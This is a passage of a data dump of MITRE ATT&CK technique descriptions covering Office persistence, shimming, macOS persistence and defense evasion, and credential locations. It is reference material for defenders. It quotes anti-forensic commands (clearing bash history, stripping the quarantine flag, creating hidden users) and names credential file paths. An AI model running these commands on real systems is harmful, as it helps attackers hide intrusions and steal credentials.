                          'normal.dotm)(Citation: Hexacorn Office Template Macros) Shared templates may also be stored '
                          'and pulled from remote locations.(Citation: GlobalDotName Jun 2019) \n'
                          '\n'
                          'Word Normal.dotm '
                          'location:<code>C:\\Users\\\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n'
                          '\n'
                          'Excel Personal.xlsb '
                          'location:<code>C:\\Users\\\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n'
                          '\n'
                          'Adversaries may also change the location of the base template to point to their own by '
                          "hijacking the application's search order, e.g. Word 2016 will first look for Normal.dotm "
                          'under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>, or by '
                          'modifying the GlobalDotName registry key. By modifying the GlobalDotName registry key an '
                          'adversary can specify an arbitrary location, file name, and file extension to use for the '
                          'template that will be loaded on application startup. To abuse GlobalDotName, adversaries '
                          'may first need to register the template as a trusted document or place it in a trusted '
                          'location.(Citation: GlobalDotName Jun 2019) \n'
                          '\n'
                          'An adversary may need to enable macros to execute unrestricted depending on the system or '
                          'enterprise security policy on use of macros.\n'
                          '\n'
                          '### Office Test\n'
                          '\n'
                          'A Registry location was found that when a DLL reference was placed within it the '
                          'corresponding DLL pointed to by the binary path would be executed every time an Office '
                          'application is started (Citation: Hexacorn Office Test)\n'
                          '\n'
                          '<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n'
                          '\n'
                          '### Add-ins\n'
                          '\n'
                          'Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft '
                          'Office Add-ins)\n'
                          '\n'
                          'Add-ins can also be used to obtain persistence because they can be set to execute code when '
                          'an Office application starts. There are different types of add-ins that can be used by the '
                          'various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, '
                          'Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual '
                          'Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office '
                          'Persistence Add-ins)(Citation: FireEye Mail CDS 2018)\n'
                          '\n'
                          '### Outlook Rules, Forms, and Home Page\n'
                          '\n'
                          'A variety of features have been discovered in Outlook that can be abused to obtain '
                          'persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) '
                          'These persistence mechanisms can work within Outlook or be used through Office '
                          '365.(Citation: TechNet O365 Outlook Rules)\n'
                          '\n'
                          'Outlook rules allow a user to define automated behavior to manage email messages. A benign '
                          'rule might, for example, automatically move an email to a particular folder in Outlook if '
                          'it contains specific words from a specific sender. Malicious Outlook rules can be created '
                          'that can trigger code execution when an adversary sends a specifically crafted email to '
                          'that user.(Citation: SilentBreak Outlook Rules)\n'
                          '\n'
                          'Outlook forms are used as templates for presentation and functionality in Outlook messages. '
                          'Custom Outlook Forms can be created that will execute code when a specifically crafted '
                          'email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost '
                          'Outlook Forms)\n'
                          '\n'
                          'Outlook Home Page is a legacy feature used to customize the presentation of Outlook '
                          'folders. This feature allows for an internal or external URL to be loaded and presented '
                          'whenever a folder is opened. A malicious HTML page can be crafted that will execute code '
                          'when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n'
                          '\n'
                          'To abuse these features, an adversary requires prior access to the user’s Outlook mailbox, '
                          'either via an Exchange/OWA server or via the client application. Once malicious rules, '
                          'forms, or Home Pages have been added to the user’s mailbox, they will be loaded when '
                          'Outlook is started. Malicious Home Pages will execute when the right Outlook folder is '
                          'loaded/reloaded while malicious rules and forms will execute when an adversary sends a '
                          'specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation: '
                          'SensePost Outlook Forms)(Citation: SensePost Outlook Home Page)',
           'name': 'Office Application Startup',
           'platforms': ['Windows', 'Office 365']},
 'T1138': {'attack_id': 'T1138',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) '
                          'was created to allow for backward compatibility of software as the operating system '
                          'codebase changes over time. For example, the application shimming feature allows developers '
                          'to apply fixes to applications (without rewriting code) that were created for Windows XP so '
                          'that it will work with Windows 10. (Citation: Endgame Process Injection July 2017) Within '
                          'the framework, shims are created to act as a buffer between the program (or more '
                          'specifically, the Import Address Table) and the Windows OS. When a program is executed, the '
                          'shim cache is referenced to determine if the program requires the use of the shim database '
                          '(.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179) '
                          'to redirect the code as necessary in order to communicate with the OS. \n'
                          '\n'
                          'A list of all shims currently installed by the default Windows installer (sdbinst.exe) is '
                          'kept in:\n'
                          '\n'
                          '* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n'
                          '* <code>hklm\\software\\microsoft\\windows '
                          'nt\\currentversion\\appcompatflags\\installedsdb</code>\n'
                          '\n'
                          'Custom databases are stored in:\n'
                          '\n'
                          '* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n'
                          '* <code>hklm\\software\\microsoft\\windows '
                          'nt\\currentversion\\appcompatflags\\custom</code>\n'
                          '\n'
                          'To keep shims secure, Windows designed them to run in user mode so they cannot modify the '
                          'kernel and you must have administrator privileges to install a shim. However, certain shims '
                          'can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) '
                          '(UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution '
                          'Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory '
                          'addresses (GetProcAddress). Similar to '
                          '[Hooking](https://attack.mitre.org/techniques/T1179), utilizing these shims may allow an '
                          'adversary to perform several malicious acts such as elevate privileges, install backdoors, '
                          'disable defenses like Windows Defender, etc.',
           'name': 'Application Shimming',
           'platforms': ['Windows']},
 'T1139': {'attack_id': 'T1139',
           'categories': ['credential-access'],
           'description': 'Bash keeps track of the commands users type on the command-line with the "history" utility. '
                          'Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. '
                          'For each user, this file resides at the same location: <code>~/.bash_history</code>. '
                          'Typically, this file keeps track of the user’s last 500 commands. Users often type '
                          'usernames and passwords on the command-line as parameters to programs, which then get saved '
                          'to this file when they log out. Attackers can abuse this by looking through the file for '
                          'potential credentials. (Citation: External to DA, the OS X Way)',
           'name': 'Bash History',
           'platforms': ['Linux', 'macOS']},
 'T1140': {'attack_id': 'T1140',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may use [Obfuscated Files or '
                          'Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion '
                          'from analysis. They may require separate mechanisms to decode or deobfuscate that '
                          'information depending on how they intend to use it. Methods for doing that include built-in '
                          'functionality of malware, [Scripting](https://attack.mitre.org/techniques/T1064), '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086), or by using utilities present on '
                          'the system.\n'
                          '\n'
                          'One such example is use of [certutil](https://attack.mitre.org/software/S0160) to decode a '
                          'remote access tool portable executable file that has been hidden inside a certificate file. '
                          '(Citation: Malwarebytes Targeted Attack against Saudi Arabia)\n'
                          '\n'
                          'Another example is using the Windows <code>copy /b</code> command to reassemble binary '
                          'fragments into a malicious payload. (Citation: Carbon Black Obfuscation Sept 2016)\n'
                          '\n'
                          'Payloads may be compressed, archived, or encrypted in order to avoid detection.  These '
                          'payloads may be used with [Obfuscated Files or '
                          'Information](https://attack.mitre.org/techniques/T1027) during Initial Access or later to '
                          "mitigate detection. Sometimes a user's action may be required to open it for deobfuscation "
                          'or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The '
                          'user may also be required to input a password to open a password protected '
                          'compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke '
                          'November 2016) Adversaries may also used compressed or archived scripts, such as '
                          'Javascript.',
           'name': 'Deobfuscate/Decode Files or Information',
           'platforms': ['Windows']},
 'T1141': {'attack_id': 'T1141',
           'categories': ['credential-access'],
           'description': 'When programs are executed that need additional privileges than are present in the current '
                          'user context, it is common for the operating system to prompt the user for proper '
                          'credentials to authorize the elevated privileges for the task (ex: [Bypass User Account '
                          'Control](https://attack.mitre.org/techniques/T1088)).\n'
                          '\n'
                          'Adversaries may mimic this functionality to prompt users for credentials with a seemingly '
                          'legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer '
                          'requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits '
                          'MacKeeper) This type of prompt can be used to collect credentials via various languages '
                          'such as [AppleScript](https://attack.mitre.org/techniques/T1155)(Citation: LogRhythm Do You '
                          'Trust Oct 2014)(Citation: OSX Keydnap malware) and '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086)(Citation: LogRhythm Do You Trust '
                          'Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015).',
           'name': 'Input Prompt',
           'platforms': ['macOS', 'Windows']},
 'T1142': {'attack_id': 'T1142',
           'categories': ['credential-access'],
           'description': "Keychains are the built-in way for macOS to keep track of users' passwords and credentials "
                          'for many services and features such as WiFi passwords, websites, secure notes, '
                          'certificates, and Kerberos. Keychain files are located in '
                          '<code>~/Library/Keychains/</code>,<code>/Library/Keychains/</code>, and '
                          '<code>/Network/Library/Keychains/</code>. (Citation: Wikipedia keychain) The '
                          '<code>security</code> command-line utility, which is built into macOS by default, provides '
                          'a useful way to manage these credentials.\n'
                          '\n'
                          'To manage their credentials, users have to use additional credentials to access their '
                          'keychain. If an adversary knows the credentials for the login keychain, then they can get '
                          'access to all the other credentials stored in this vault. (Citation: External to DA, the OS '
                          'X Way) By default, the passphrase for the keychain is the user’s logon credentials.',
           'name': 'Keychain',
           'platforms': ['macOS']},
 'T1143': {'attack_id': 'T1143',
           'categories': ['defense-evasion'],
           'description': 'Adversaries may implement hidden windows to conceal malicious activity from the plain sight '
                          'of users. In some cases, windows that would typically be displayed when an application '
                          'carries out an operation can be hidden. This may be utilized by system administrators to '
                          'avoid disrupting user work environments when carrying out administrative tasks. Adversaries '
                          'may abuse operating system functionality to hide otherwise visible windows from users so as '
                          'not to alert the user to adversary activity on the system.\n'
                          '\n'
                          '### Windows\n'
                          'There are a variety of features in scripting languages in Windows, such as '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086), Jscript, and VBScript to make '
                          'windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.  '
                          '(Citation: PowerShell About 2019)\n'
                          '\n'
                          '### Mac\n'
                          'The configurations for how applications run on macOS are listed in property list (plist) '
                          'files. One of the tags in these files can be\xa0<code>apple.awt.UIElement</code>, which '
                          "allows for Java applications to prevent the application's icon from appearing in the Dock. "
                          "A common use for this is when applications run in the system tray, but don't also want to "
                          'show up in the Dock. However, adversaries can abuse this feature and hide their running '
                          'window.(Citation: Antiquated Mac Malware)\n',
           'name': 'Hidden Window',
           'platforms': ['macOS', 'Windows']},
 'T1144': {'attack_id': 'T1144',
           'categories': ['defense-evasion'],
           'description': 'In macOS and OS X, when applications or programs are downloaded from the internet, there is '
                          'a special attribute set on the file called <code>com.apple.quarantine</code>. This '
                          "attribute is read by Apple's Gatekeeper defense program at execution time and provides a "
                          'prompt to the user to allow or deny execution. \n'
                          '\n'
                          'Apps loaded onto the system from USB flash drive, optical disk, external hard drive, or '
                          'even from a drive shared over the local network won’t set this flag. Additionally, other '
                          'utilities or events like drive-by downloads don’t necessarily set it either. This '
                          'completely bypasses the built-in Gatekeeper check. (Citation: Methods of Mac Malware '
                          'Persistence) The presence of the quarantine flag can be checked by the xattr command '
                          '<code>xattr /path/to/MyApp.app</code> for <code>com.apple.quarantine</code>. Similarly, '
                          'given sudo access or elevated permission, this attribute can be removed with xattr as well, '
                          '<code>sudo xattr -r -d com.apple.quarantine /path/to/MyApp.app</code>. (Citation: Clearing '
                          'quarantine attribute) (Citation: OceanLotus for OS X)\n'
                          ' \n'
                          'In typical operation, a file will be downloaded from the internet and given a quarantine '
                          'flag before being saved to disk. When the user tries to open the file or application, '
                          'macOS’s gatekeeper will step in and check for the presence of this flag. If it exists, then '
                          'macOS will then prompt the user to confirmation that they want to run the program and will '
                          'even provide the URL where the application came from. However, this is all based on the '
                          'file being downloaded from a quarantine-savvy application. (Citation: Bypassing Gatekeeper)',
           'name': 'Gatekeeper Bypass',
           'platforms': ['macOS']},
 'T1145': {'attack_id': 'T1145',
           'categories': ['credential-access'],
           'description': 'Private cryptographic keys and certificates are used for authentication, '
                          'encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)\n'
                          '\n'
                          'Adversaries may gather private keys from compromised systems for use in authenticating to '
                          '[Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in '
                          'decrypting other collected files such as email. Common key and certificate file extensions '
                          'include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also '
                          'look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based '
                          'systems or <code>C:\\Users\\(username)\\.ssh\\</code> on Windows.\n'
                          '\n'
                          'Private keys should require a password or passphrase for operation, so an adversary may '
                          'also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or '
                          'attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase '
                          'off-line.\n'
                          '\n'
                          'Adversary tools have been discovered that search compromised systems for file extensions '
                          'relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: '
                          'Palo Alto Prince of Persia)',
           'name': 'Private Keys',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1146': {'attack_id': 'T1146',
           'categories': ['defense-evasion'],
           'description': 'macOS and Linux both keep track of the commands users type in their terminal so that users '
                          "can easily remember what they've done. These logs can be accessed in a few different ways. "
                          'While logged in, this command history is tracked in a file pointed to by the environment '
                          'variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed '
                          "to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of "
                          "this is that it allows users to go back to commands they've used before in different "
                          'sessions. Since everything typed on the command-line is saved, passwords passed in on the '
                          'command line are also saved. Adversaries can abuse this by searching these files for '
                          'cleartext passwords. Additionally, adversaries can use a variety of methods to prevent '
                          'their own commands from appear in these logs such as <code>unset HISTFILE</code>, '
                          '<code>export HISTFILESIZE=0</code>, <code>history -c</code>, <code>rm '
                          '~/.bash_history</code>.',
           'name': 'Clear Command History',
           'platforms': ['Linux', 'macOS']},
 'T1147': {'attack_id': 'T1147',
           'categories': ['defense-evasion'],
           'description': 'Every user account in macOS has a userID associated with it. When creating a user, you can '
                          'specify the userID for that account. There is a property value in '
                          '<code>/Library/Preferences/com.apple.loginwindow</code> called <code>Hide500Users</code> '
                          'that prevents users with userIDs 500 and lower from appearing at the login screen. By using '
                          'the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID '
                          'under 500 and enabling this property (setting it to Yes), an adversary can hide their user '
                          'accounts much more easily: <code>sudo dscl . -create /Users/username UniqueID 401</code> '
                          '(Citation: Cybereason OSX Pirrit).',
           'name': 'Hidden Users',
           'platforms': ['macOS']},
 'T1148': {'attack_id': 'T1148',
           'categories': ['defense-evasion'],
           'description': 'The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by '
                          'the <code>history</code> command and eventually into the <code>~/.bash_history</code> file '
                          'when a user logs out. This setting can be configured to ignore commands that start with a '
                          'space by simply setting it to "ignorespace". <code>HISTCONTROL</code> can also be set to '
                          'ignore duplicate commands by setting it to "ignoredups". In some Linux systems, this is set '
                          'by default to "ignoreboth" which covers both of the previous examples. This means that “ '
                          'ls” will not be saved, but “ls” would be saved by history. <code>HISTCONTROL</code> does '
                          'not exist by default on macOS, but can be set by the user and will be respected. '
                          'Adversaries can use this to operate without leaving traces by simply prepending a space to '
                          'all of their terminal commands.',
           'name': 'HISTCONTROL',
           'platforms': ['Linux', 'macOS']},
 'T1149': {'attack_id': 'T1149',
           'categories': ['defense-evasion'],
           'description': 'As of OS X 10.8, mach-O binaries introduced a new header called LC_MAIN that points to the '
                          'binary’s entry point for execution. Previously, there were two headers to achieve this same '
                          'effect: LC_THREAD and LC_UNIXTHREAD  (Citation: Prolific OSX Malware History). The entry '
                          'point for a binary can be hijacked so that initial execution flows to a malicious addition '
                          '(either another section or a code cave) and then goes back to the initial entry point so '
                          'that the victim doesn’t know anything was different  (Citation: Methods of Mac Malware '
                          'Persistence). By modifying a binary in this way, application whitelisting can be bypassed '
                          'because the file name or application path is still the same.',
           'name': 'LC_MAIN Hijacking',
           'platforms': ['macOS']},
 'T1150': {'attack_id': 'T1150',
           'categories': ['defense-evasion', 'persistence', 'privilege-escalation'],
           'description': 'Property list (plist) files contain all of the information that macOS and OS X uses to '
                          'configure applications and services. These files are UTF-8 encoded and formatted like XML '
                          'documents via a series of keys surrounded by < >. They detail when programs should execute, '
                          'file paths to the executables, program arguments, required OS permissions, and many others. '
                          'plists are located in certain locations depending on their purpose such as '
                          '<code>/Library/Preferences</code> (which execute with elevated privileges) and '
                          "<code>~/Library/Preferences</code> (which execute with a user's privileges). \n"
                          'Adversaries can modify these plist files to point to their own code, can use them to '
                          'execute their code in the context of another user, bypass whitelisting procedures, or even '
                          'use them as a persistence mechanism. (Citation: Sofacy Komplex Trojan)',
           'name': 'Plist Modification',
           'platforms': ['macOS']},
 'T1151': {'attack_id': 'T1151',
           'categories': ['defense-evasion', 'execution'],
           'description': "Adversaries can hide a program's true filetype by changing the extension of a file. With "
                          'certain file types (specifically this does not work with .app extensions), appending a '
                          'space to the end of a filename will change how the file is processed by the operating '
                          'system. For example, if there is a Mach-O executable file called evil.bin, when it is '
                          'double clicked by a user, it will launch Terminal.app and execute. If this file is renamed '
                          'to evil.txt, then when double clicked by a user, it will launch with the default text '
                          'editing application (not executing the binary). However, if the file is renamed to '
                          '"evil.txt " (note the space at the end), then when double clicked by a user, the true file '
                          'type is determined by the OS and handled appropriately and the binary will be executed '
                          '(Citation: Mac Backdoors are back). \n'
                          '\n'
                          'Adversaries can use this feature to trick users into double clicking benign-looking files '
                          'of any format and ultimately executing something malicious.',
           'name': 'Space after Filename',
           'platforms': ['Linux', 'macOS']},
 'T1152': {'attack_id': 'T1152',
           'categories': ['defense-evasion', 'execution', 'persistence'],
           'description': 'Launchctl controls the macOS launchd process which handles things like launch agents and '
                          'launch daemons, but can execute other commands or programs itself. Launchctl supports '
                          'taking subcommands on the command-line, interactively, or even redirected from standard '
                          'input. By loading or reloading launch agents or launch daemons, adversaries can install '
                          'persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a '
                          'command from launchctl is as simple as <code>launchctl submit -l <labelName> -- '
                          '/Path/to/thing/to/execute "arg" "arg" "arg"</code>. Loading, unloading, or reloading launch '
                          'agents or launch daemons can require elevated privileges. \n'
                          '\n'
                          'Adversaries can abuse this functionality to execute code or even bypass whitelisting if '
                          'launchctl is an allowed process.',
           'name': 'Launchctl',
           'platforms': ['macOS']},
 'T1153': {'attack_id': 'T1153',
           'categories': ['execution'],
           'description': 'The <code>source</code> command loads functions into the current shell or executes files in '
                          'the current context. This built-in command can be run in two different ways <code>source '
                          '/path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take '
                          'note of the space after the ".". Without a space, a new shell is created that runs the '
                          'program instead of running the program within the current context. This is often used to '
                          "make certain features or functions available to a shell or to update a specific shell's "
                          'environment.(Citation: Source Manual)\n'
                          '\n'
                          'Adversaries can abuse this functionality to execute programs. The file executed with this '
                          'technique does not need to be marked executable beforehand.',
           'name': 'Source',
           'platforms': ['Linux', 'macOS']},
 'T1154': {'attack_id': 'T1154',
           'categories': ['execution', 'persistence'],
           'description': 'The <code>trap</code> command allows programs and shells to specify commands that will be '
                          'executed upon receiving interrupt signals. A common situation is a script allowing for '
                          'graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> '
                          'and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the '
                          'shell encounters specific interrupts either to gain execution or as a persistence '
                          "mechanism. Trap commands are of the following format <code>trap 'command list' "
                          'signals</code> where "command list" will be executed when "signals" are received.(Citation: '
                          'Trap Manual)(Citation: Cyberciti Trap Statements)',
           'name': 'Trap',
           'platforms': ['Linux', 'macOS']},
 'T1155': {'attack_id': 'T1155',
           'categories': ['execution', 'lateral-movement'],
           'description': 'macOS and OS X applications send AppleEvent messages to each other for interprocess '
                          'communications (IPC). These messages can be easily scripted with AppleScript for local or '
                          'remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) '
                          'language scripts. A list of OSA languages installed on a system can be found by using the '
                          '<code>osalang</code> program.\n'
                          'AppleEvent messages can be sent independently or as part of a script. These events can '
                          'locate open windows, send keystrokes, and interact with almost any open application locally '
                          'or remotely. \n'
                          '\n'
                          'Adversaries can use this to interact with open SSH connection, move to remote machines, and '
                          'even present users with fake dialog boxes. These events cannot start applications remotely '
                          "(they can start them locally though), but can interact with applications if they're already "
                          'running remotely. Since this is a scripting language, it can be used to launch more common '
                          'techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets '
                          'Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> '
                          'or <code>osascript -e "script here"</code>.',
           'name': 'AppleScript',
           'platforms': ['macOS']},
 'T1156': {'attack_id': 'T1156',
           'categories': ['persistence'],
           'description': '<code>~/.bash_profile</code> and <code>~/.bashrc</code> are shell scripts that contain '
                          "shell commands. These files are executed in a user's context when a new shell opens or when "
                          'a user logs in so that their environment is set correctly. <code>~/.bash_profile</code> is '
                          'executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login '
                          'shells. This means that when a user logs in (via username and password) to the console '
                          '(either locally or remotely via something like SSH), the <code>~/.bash_profile</code> '
                          'script is executed before the initial command prompt is returned to the user. After that, '
                          'every time a new shell is opened, the <code>~/.bashrc</code> script is executed. This '
                          'allows users more fine-grained control over when they want certain commands executed. These '
                          'shell scripts are meant to be written to by the local user to configure their own '
                          'environment. \n'
                          '\n'
                          'The macOS Terminal.app is a little different in that it runs a login shell by default each '
                          'time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time '
                          'instead of <code>~/.bashrc</code>.\n'
                          '\n'
                          'Adversaries may abuse these shell scripts by inserting arbitrary shell commands that may be '
                          'used to execute other binaries to gain persistence. Every time the user logs in or opens a '
                          'new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be '
                          'executed.(Citation: amnesia malware).',
           'name': '.bash_profile and .bashrc',
           'platforms': ['Linux', 'macOS']},
 'T1157': {'attack_id': 'T1157',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'macOS and OS X use a common method to look for required dynamic libraries (dylib) to load '
                          'into a program based on search paths. Adversaries can take advantage of ambiguous paths to '
                          'plant dylibs to gain privilege escalation or persistence.\n'
                          '\n'
                          'A common method is to see what dylibs an application uses, then plant a malicious version '
                          'with the same name higher up in the search path. This typically results in the dylib being '
                          'in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) '
                          '(Citation: Malware Persistence on OS X)\n'
                          '\n'
                          'If the program is configured to run at a higher privilege level than the current user, then '
                          'when the dylib is loaded into the application, the dylib will also run at that elevated '
                          'level. This can be used by adversaries as a privilege escalation technique.',
           'name': 'Dylib Hijacking',
           'platforms': ['macOS']},
 'T1158': {'attack_id': 'T1158',
           'categories': ['defense-evasion', 'persistence'],
           'description': 'To prevent normal users from accidentally changing special files on a system, most '
                          'operating systems have the concept of a ‘hidden’ file. These files don’t show up when a '
                          'user browses the file system with a GUI or when using normal commands on the command line. '
                          'Users must explicitly ask to show the hidden files either via a series of Graphical User '
                          'Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and '
                          '<code>ls –a</code> for Linux and macOS).\n'
                          '\n'
                          'Adversaries can use this to their advantage to hide files and folders anywhere on the '
                          'system for persistence and evading a typical user or system analysis that does not '
                          'incorporate investigation of hidden files.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Users can mark specific files as hidden by using the attrib.exe binary. Simply do '
                          '<code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” '
                          'marks a file as a system file and the “+r” flag marks the file as read only. Like most '
                          'windows binaries, the attrib.exe binary provides the ability to apply these changes '
                          'recursively “/S”.\n'
                          '\n'
                          '### Linux/Mac\n'
                          '\n'
                          'Users can mark specific files as hidden simply by putting a “.” as the first character in '
                          'the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac '
                          'Malware). Files and folder that start with a period, ‘.’, are by default hidden from being '
                          'viewed in the Finder application and standard command-line utilities like “ls”. Users must '
                          'specifically change settings to have these files viewable. For command line usages, there '
                          'is typically a flag to see all files (including hidden ones). To view these files in the '
                          'Finder Application, the following command must be executed: <code>defaults write '
                          'com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in '
                          'Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\n'
                          'Many applications create these hidden files and folders to store information so that it '
                          'doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder '
                          'that’s hidden and contains the user’s known hosts and keys.',
           'name': 'Hidden Files and Directories',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1159': {'attack_id': 'T1159',
           'categories': ['persistence'],
           'description': 'Per Apple’s developer documentation, when a user logs in, a per-user launchd process is '
                          'started which loads the parameters for each launch-on-demand user agent from the property '
                          'list (plist) files found in <code>/System/Library/LaunchAgents</code>, '
                          '<code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code> (Citation: '
                          'AppleDocs Launch Agent Daemons) (Citation: OSX Keydnap malware) (Citation: Antiquated Mac '
                          'Malware). These launch agents have property list files which point to the executables that '
                          'will be launched (Citation: OSX.Dok Malware).\n'
                          ' \n'
                          'Adversaries may install a new launch agent that can be configured to execute at login by '
                          'using launchd or launchctl to load a plist into the appropriate directories  (Citation: '
                          'Sofacy Komplex Trojan)  (Citation: Methods of Mac Malware Persistence). The agent name may '
                          'be disguised by using a name from a related operating system or benign software. Launch '
                          'Agents are created with user level privileges and are executed with the privileges of the '
                          'user when they log in (Citation: OSX Malware Detection) (Citation: OceanLotus for OS X). '
                          'They can be set up to execute when a specific user logs in (in the specific user’s '
                          'directory structure) or when any user logs in (which requires administrator privileges).',
           'name': 'Launch Agent',
           'platforms': ['macOS']},
 'T1160': {'attack_id': 'T1160',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Per Apple’s developer documentation, when macOS and OS X boot up, launchd is run to finish '
                          'system initialization. This process loads the parameters for each launch-on-demand '
                          'system-level daemon from the property list (plist) files found in '
                          '<code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code> '
                          '(Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files '
                          'which point to the executables that will be launched (Citation: Methods of Mac Malware '
                          'Persistence).\n'
                          ' \n'
                          'Adversaries may install a new launch daemon that can be configured to execute at startup by '
                          'using launchd or launchctl to load a plist into the appropriate directories (Citation: OSX '
                          'Malware Detection). The daemon name may be disguised by using a name from a related '
                          'operating system or benign software  (Citation: WireLurker). Launch Daemons may be created '
                          'with administrator privileges, but are executed under root privileges, so an adversary may '
                          'also use a service to escalate privileges from administrator to root.\n'
                          ' \n'
                          'The plist file permissions must be root:wheel, but the script or program that it points to '
                          'has no such requirement. So, it is possible for poor configurations to allow an adversary '
                          'to modify a current Launch Daemon’s executable and gain persistence or Privilege '
                          'Escalation.',
           'name': 'Launch Daemon',
           'platforms': ['macOS']},
 'T1161': {'attack_id': 'T1161',
           'categories': ['persistence'],
           'description': 'Mach-O binaries have a series of headers that are used to perform certain operations when a '
                          'binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which '
                          'dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the '
                          'compiled binary as long adjustments are made to the rest of the fields and dependencies '
                          '(Citation: Writing Bad Malware for OSX). There are tools available to perform these '
                          'changes. Any changes will invalidate digital signatures on binaries because the binary is '
                          'being modified. Adversaries can remediate this issue by simply removing the '
                          'LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time '
                          '(Citation: Malware Persistence on OS X).',
           'name': 'LC_LOAD_DYLIB Addition',
           'platforms': ['macOS']},
 'T1162': {'attack_id': 'T1162',
           'categories': ['persistence'],
           'description': 'MacOS provides the option to list specific applications to run when a user logs in. These '
                          "applications run under the logged in user's context, and will be started every time the "
                          'user logs in. Login items installed using the Service Management Framework are not visible '
                          'in the System Preferences and can only be removed by the application that created them '
                          '(Citation: Adding Login Items). Users have direct control over login items installed using '
                          'a shared file list which are also visible in System Preferences (Citation: Adding Login '
                          "Items). These login items are stored in the user's <code>~/Library/Preferences/</code> "
                          'directory in a plist file called <code>com.apple.loginitems.plist</code> (Citation: Methods '
                          'of Mac Malware Persistence). Some of these applications can open visible dialogs to the '
                          'user, but they don’t all have to since there is an option to ‘Hide’ the window. If an '
                          'adversary can register their own login item or modified an existing one, then they can use '
                          'it to execute their code for a persistence mechanism each time the user logs in (Citation: '
                          'Malware Persistence on OS X) (Citation: OSX.Dok Malware). The API method <code> '
                          'SMLoginItemSetEnabled </code> can be used to set Login Items, but scripting languages like '
                          '[AppleScript](https://attack.mitre.org/techniques/T1155) can do this as well  (Citation: '
                          'Adding Login Items).',
           'name': 'Login Item',
           'platforms': ['macOS']},
 'T1163': {'attack_id': 'T1163',
           'categories': ['persistence'],
           'description': 'During the boot process, macOS executes <code>source /etc/rc.common</code>, which is a '
                          'shell script containing various utility functions. This file also defines routines for '
                          'processing command-line arguments and for gathering system settings, and is thus '
                          'recommended to include in the start of Startup Item Scripts (Citation: Startup Items). In '
                          'macOS and OS X, this is now a deprecated technique in favor of launch agents and launch '
                          'daemons, but is currently still used.\n'
                          '\n'
